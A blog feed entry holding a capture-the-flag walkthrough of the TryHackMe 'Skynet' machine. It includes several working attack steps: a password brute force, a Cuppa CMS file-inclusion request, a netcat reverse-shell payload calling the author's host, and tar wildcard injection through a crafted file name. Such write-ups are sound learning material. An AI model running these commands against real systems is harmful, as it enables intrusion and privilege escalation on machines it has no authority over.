<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-02-28T10:37:02-08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">DSPO6</title><subtitle>A place to document my journey in information security.</subtitle><entry><title type="html">Tryhackme Walkthough - Skynet</title><link href="http://localhost:4000/tryhackme/2021/02/28/tryhackme-skynet.html" rel="alternate" type="text/html" title="Tryhackme Walkthough - Skynet" /><published>2021-02-28T08:18:19-08:00</published><updated>2021-02-28T08:18:19-08:00</updated><id>http://localhost:4000/tryhackme/2021/02/28/tryhackme-skynet</id><content type="html" xml:base="http://localhost:4000/tryhackme/2021/02/28/tryhackme-skynet.html">&lt;p&gt;There isn’t much information about this room on the &lt;a href=&quot;https://tryhackme.com/room/skynet&quot;&gt;Tryhackme&lt;/a&gt; page apart from that it is a Terminator themed machine so we will jump right in.&lt;/p&gt;

&lt;h2 id=&quot;initial-enumeration&quot;&gt;Initial Enumeration&lt;/h2&gt;
&lt;p&gt;The nmap scan show the following ports open&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The webste on port 80 shows this page but looking at the source there isn’t much else to enumerate.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/20210228074256.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I ran a gobuster scan and that found the following folders.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/admin (Status: 301)
/config (Status: 301)
/css (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
/server-status (Status: 403)
/squirrelmail (Status: 301)
==============================
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The most interesting one here is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/squirrelmail&lt;/code&gt; and navigating to it shows a log in screen.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/20210228081225.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I checked the Exploit DB to see if there was something available for version 1.423 but nothing stood out as being worth trying at this stage.&lt;/p&gt;

&lt;h3 id=&quot;enumerating-smb&quot;&gt;Enumerating SMB&lt;/h3&gt;
&lt;p&gt;I ran enum4linx and the output showed 4 shares one of which was anonymous&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//10.10.237.154/print$  Mapping: DENIED, Listing: N/A
//10.10.237.154/anonymous       Mapping: OK, Listing: OK
//10.10.237.154/milesdyson      Mapping: DENIED, Listing: N/A
//10.10.237.154/IPC$    [E] Can't understand response:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using smbclient without a password, I discovered a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;attention.txt&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ smbclient -U Anonymous //$IP/anonymous
Enter WORKGROUP\Anonymous's password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; 
smb: \&amp;gt; ls
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5829532 blocks available
smb: \&amp;gt; mget attention.txt
Get file attention.txt? yes
getting file \attention.txt of size 163 as attention.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This file contained the following text:-&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ cat attention.txt 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
(dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I also navigated to the logs directory which contained 3 log files&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smb: \logs\&amp;gt; ls
  .                                   D        0  Wed Sep 18 00:42:16 2019
  ..                                  D        0  Thu Nov 26 11:04:00 2020
  log2.txt                            N        0  Wed Sep 18 00:42:13 2019
  log1.txt                            N      471  Wed Sep 18 00:41:59 2019
  log3.txt                            N        0  Wed Sep 18 00:42:16 2019
 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Two were zero bytes but the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log1.txt&lt;/code&gt; contains a list of what could be passwords.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; (dspo6㉿kali)[~/pentest/boxes/thm/Skynet/smb]$ cat log1.txt 
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;logging-in-to-email-and-then-smb&quot;&gt;Logging in to Email and then SMB&lt;/h2&gt;

&lt;p&gt;Going back to the squirrel mail login page, I launched Burpsuite intruder with the list of potential passwords and the name milesdyson that I saw in SMB enumeration.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/20210228075545.png&quot;&gt;&lt;img src=&quot;/assets/img/20210228075545.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/20210228075749.png&quot;&gt;&lt;img src=&quot;/assets/img/20210228075749.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Looks like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyborg007haloterminator&lt;/code&gt; is the password and we are in.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/20210228075833.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And the first email mentions a  password&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/20210228080713.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Which I then try with the open share for milesdyson found earlier.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(dspo6㉿kali)[](~/pentest/boxes/thm/Skynet]$ smbclient -U milesdyson //10.10.174.240/milesdyson
Enter WORKGROUP\milesdyson's password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Tue Sep 17 05:05:47 2019
  ..                                  D        0  Tue Sep 17 23:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 05:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 05:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 05:05:14 2019
  notes                               D        0  Tue Sep 17 05:18:40 2019
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Navigating to the notes directory, I see that there is a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;important.txt&lt;/code&gt; with the following text.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ cat important.txt 

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
(dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;cms-enumeration&quot;&gt;CMS Enumeration&lt;/h2&gt;

&lt;p&gt;Navigating to to the folder mentioned in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;important.txt&lt;/code&gt; file we find this page.&lt;/p&gt;

&lt;p&gt;![/assets/img/20210228081847.png)&lt;/p&gt;

&lt;p&gt;I decide to run gobuster again on this page and the output shows that there is an administrator page&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ gobuster dir -u 10.10.174.240/45kra24zxs28v3yd  -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.174.240/45kra24zxs28v3yd
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/23 20:01:43 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.hta (Status: 403)
/.htaccess (Status: 403)
/administrator (Status: 301)
/index.html (Status: 200)
===============================================================
2021/02/23 20:03:00 Finished
===============================================================
(dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The CMS running is Cuppa CMS&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/20210228082043.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cms-exploitation&quot;&gt;CMS Exploitation&lt;/h2&gt;
&lt;p&gt;Searchspolit leads to this exploit &lt;a href=&quot;https://www.exploit-db.com/exploits/25971&quot;&gt;https://www.exploit-db.com/exploits/25971&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ searchsploit cuppa
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                           |  Path
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                          | php/webapps/25971.txt
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
(dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I try the exploit to see if it works and it does&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.125.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/20210228082507.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I now try to upload a PHP reverse shell from a webserver on my machine.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(dspo6㉿kali)\[~/pentest/boxes/thm/Skynet\]$ curl http://10.10.125.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.2.2.175/php-reverse-shell.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It works - we are in!&lt;/p&gt;

&lt;h2 id=&quot;getting-the-user-flag&quot;&gt;Getting the User Flag&lt;/h2&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(dspo6㉿kali)[~]$ nc -lvnp 9003
listening on [any] 9003 ...
connect to [10.2.2.175] from (UNKNOWN) [10.10.125.81] 46742
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 19:38:51 up 39 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I stabilize the shell&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'                                                                                      
www-data@skynet:/usr$ export TERM=xterm                                                                                               
export TERM=xterm                                                                                                                     
www-data@skynet:/usr$ stty raw -echo; fg                                                                                              
stty raw -echo; fg                                                                                                                    
bash: fg: current: no such job                                                                                                        
www-data@skynet:/usr$    
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And get the flag&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@skynet:/$ ls
bin   home            lib64       opt   sbin  tmp      vmlinuz.old
boot  initrd.img      lost+found  proc  snap  usr
dev   initrd.img.old  media       root  srv   var
etc   lib             mnt         run   sys   vmlinuz
www-data@skynet:/$ cd home
www-data@skynet:/home$ ls
milesdyson
www-data@skynet:/home$ cd milesdyson
www-data@skynet:/home/milesdyson$ ls
backups  mail  share  user.txt
www-data@skynet:/home/milesdyson$ cat user.txt
xxxe5c2109a40f95809xxxxxxx
www-data@skynet:/home/milesdyson$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;escalation&quot;&gt;Escalation&lt;/h2&gt;
&lt;p&gt;We are currently running under the www-data account.&lt;/p&gt;

&lt;p&gt;Using the password we found earlier I can change to the milesdyson account but that doesn’t help us right now.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@skynet:/home/milesdyson$ su milesdyson
Password: cyborg007haloterminator  

milesdyson@skynet:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I checked to see if there were any cron jobs running and found one called backup.sh that ran every minute&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@skynet:/home/milesdyson$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly )
#
www-data@skynet:/home/milesdyson$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Unfortunately, this is running under root.&lt;/p&gt;

&lt;p&gt;Looking at the script I see  this.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@skynet:/home/milesdyson/backups$ cat backup.sh 
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
www-data@skynet:/home/milesdyson/backups$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;brick-wall&quot;&gt;Brick Wall&lt;/h2&gt;
&lt;p&gt;After trying many things, I hit a brick wall and was stuck so I had to resort to trying to find a hint on the web.&lt;/p&gt;

&lt;p&gt;It was this research that led me to this walktough on YouTube by &lt;a href=&quot;https://youtu.be/HXikLrFVIXc&quot;&gt;John Hammond&lt;/a&gt; which highlighted a technique, tar wildcard injection which can be read about on this &lt;a href=&quot;https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/&quot;&gt;site&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;escalation-resumed&quot;&gt;Escalation (Resumed)&lt;/h2&gt;
&lt;p&gt;I created reverse netcat shellcode using msfvenom&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(dspo6㉿kali)[~/pentest/pentest_utils/shells]$ msfvenom -p cmd/unix/reverse_netcat lhost=10.2.2.175 lport=8888 R
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 88 bytes
mkfifo /tmp/pbwq; nc 10.2.2.175 8888 0&amp;lt;/tmp/pbwq | /bin/sh &amp;gt;/tmp/pbwq 2&amp;gt;&amp;amp;1; rm /tmp/pbwq
(dspo6㉿kali)[~/pentest/pentest_utils/shells]$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I then created a script on the target using this shellcode and copied it to the folder being backup by the cron job.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@skynet:/dev/shm$ echo &quot;mkfifo /tmp/pbwq; nc 10.2.2.175 8888 0&amp;lt;/tmp/pbwq | /bin/sh &amp;gt;/tmp/pbwq 2&amp;gt;&amp;amp;1; rm /tmp/pbwq
&amp;gt; &quot; &amp;gt; shell.sh
www-data@skynet:/dev/shm$
www-data@skynet:/dev/shm$ cp shell.sh /var/www/html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I then ran through the steps indicated on the tar wildcard page and waited for the backup cron job to run.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@skynet:/dev/shm$ cp --checkpoint=1 /var/www/html
cp: unrecognized option '--checkpoint=1'
Try 'cp --help' for more information.
www-data@skynet:/dev/shm$ cd /var/www/html
www-data@skynet:/var/www/html$ echo &quot;&quot; &amp;gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Shell acheived.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(dspo6㉿kali)[~]$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.2.2.175] from (UNKNOWN) [10.10.184.206] 55396
ls
45kra24zxs28v3yd
admin
ai
--checkpoint-action=exec=sh shell.sh
config
css
image.png
index.html
js
shell.sh
style.css
cd ..
ls
html
cd ..
cd /root
ls
root.txt
cat root.txt
XXX4753accc7179a282XXX
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; the tar wildcard exploit says that there is one more command but I got a shell before I executed it.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo &quot;&quot; &amp;gt; --checkpoint=1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;The first half of owning this box was fun but it was frustrating to have to resort to checking other walkthroughs to make progress at the escalation part.&lt;/p&gt;

&lt;p&gt;Since I am still learning these techniques, maybe it is not all that bad. I found out about something new and maybe I will be able to use this knowledge in the future.&lt;/p&gt;</content><author><name></name></author><category term="tryhackme" /><summary type="html">There isn’t much information about this room on the Tryhackme page apart from that it is a Terminator themed machine so we will jump right in. Initial Enumeration The nmap scan show the following ports open 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 110/tcp open pop3 Dovecot pop3d 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 143/tcp open imap Dovecot imapd 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: ... The webste on port 80 shows this page but looking at the source there isn’t much else to enumerate. I ran a gobuster scan and that found the following folders. /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /admin (Status: 301) /config (Status: 301) /css (Status: 301) /index.html (Status: 200) /js (Status: 301) /server-status (Status: 403) /squirrelmail (Status: 301) ============================== The most interesting one here is the /squirrelmail and navigating to it shows a log in screen. I checked the Exploit DB to see if there was something available for version 1.423 but nothing stood out as being worth trying at this stage. Enumerating SMB I ran enum4linx and the output showed 4 shares one of which was anonymous //10.10.237.154/print$ Mapping: DENIED, Listing: N/A //10.10.237.154/anonymous Mapping: OK, Listing: OK //10.10.237.154/milesdyson Mapping: DENIED, Listing: N/A //10.10.237.154/IPC$ [E] Can't understand response: Using smbclient without a password, I discovered a file called attention.txt (dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ smbclient -U Anonymous //$IP/anonymous Enter WORKGROUP\Anonymous's password: Try &quot;help&quot; to get a list of possible commands. smb: \&amp;gt; smb: \&amp;gt; ls . D 0 Thu Nov 26 11:04:00 2020 .. D 0 Tue Sep 17 03:20:17 2019 attention.txt N 163 Tue Sep 17 23:04:59 2019 logs D 0 Wed Sep 18 00:42:16 2019 9204224 blocks of size 1024. 5829532 blocks available smb: \&amp;gt; mget attention.txt Get file attention.txt? yes getting file \attention.txt of size 163 as attention.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec) smb: \&amp;gt; This file contained the following text:- (dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ cat attention.txt A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this. -Miles Dyson (dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ I also navigated to the logs directory which contained 3 log files smb: \logs\&amp;gt; ls . D 0 Wed Sep 18 00:42:16 2019 .. D 0 Thu Nov 26 11:04:00 2020 log2.txt N 0 Wed Sep 18 00:42:13 2019 log1.txt N 471 Wed Sep 18 00:41:59 2019 log3.txt N 0 Wed Sep 18 00:42:16 2019 ... Two were zero bytes but the log1.txt contains a list of what could be passwords. (dspo6㉿kali)[~/pentest/boxes/thm/Skynet/smb]$ cat log1.txt cyborg007haloterminator terminator22596 terminator219 terminator20 terminator1989 terminator1988 terminator168 terminator16 terminator143 terminator13 terminator123!@# terminator1056 terminator101 terminator10 terminator02 terminator00 roboterminator pongterminator manasturcaluterminator exterminator95 exterminator200 dterminator djxterminator dexterminator determinator cyborg007haloterminator avsterminator alonsoterminator Walterminator 79terminator6 1996terminator Logging in to Email and then SMB Going back to the squirrel mail login page, I launched Burpsuite intruder with the list of potential passwords and the name milesdyson that I saw in SMB enumeration. Looks like cyborg007haloterminator is the password and we are in. And the first email mentions a password Which I then try with the open share for milesdyson found earlier. (dspo6㉿kali)[](~/pentest/boxes/thm/Skynet]$ smbclient -U milesdyson //10.10.174.240/milesdyson Enter WORKGROUP\milesdyson's password: Try &quot;help&quot; to get a list of possible commands. smb: \&amp;gt; ls . D 0 Tue Sep 17 05:05:47 2019 .. D 0 Tue Sep 17 23:51:03 2019 Improving Deep Neural Networks.pdf N 5743095 Tue Sep 17 05:05:14 2019 Natural Language Processing-Building Sequence Models.pdf N 12927230 Tue Sep 17 05:05:14 2019 Convolutional Neural Networks-CNN.pdf N 19655446 Tue Sep 17 05:05:14 2019 notes D 0 Tue Sep 17 05:18:40 2019 Navigating to the notes directory, I see that there is a file called important.txt with the following text. (dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ cat important.txt 1. Add features to beta CMS /45kra24zxs28v3yd 2. Work on T-800 Model 101 blueprints 3. Spend more time with my wife (dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ CMS Enumeration Navigating to to the folder mentioned in the important.txt file we find this page. ![/assets/img/20210228081847.png) I decide to run gobuster again on this page and the output shows that there is an administrator page (dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ gobuster dir -u 10.10.174.240/45kra24zxs28v3yd -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.174.240/45kra24zxs28v3yd [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/02/23 20:01:43 Starting gobuster =============================================================== /.htpasswd (Status: 403) /.hta (Status: 403) /.htaccess (Status: 403) /administrator (Status: 301) /index.html (Status: 200) =============================================================== 2021/02/23 20:03:00 Finished =============================================================== (dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ The CMS running is Cuppa CMS CMS Exploitation Searchspolit leads to this exploit https://www.exploit-db.com/exploits/25971 (dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ searchsploit cuppa ------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------- --------------------------------- Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion | php/webapps/25971.txt ------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Papers: No Results (dspo6㉿kali)[~/pentest/boxes/thm/Skynet]$ I try the exploit to see if it works and it does http://10.10.125.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd I now try to upload a PHP reverse shell from a webserver on my machine. (dspo6㉿kali)\[~/pentest/boxes/thm/Skynet\]$ curl http://10.10.125.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.2.2.175/php-reverse-shell.php It works - we are in! Getting the User Flag (dspo6㉿kali)[~]$ nc -lvnp 9003 listening on [any] 9003 ... connect to [10.2.2.175] from (UNKNOWN) [10.10.125.81] 46742 Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux 19:38:51 up 39 min, 0 users, 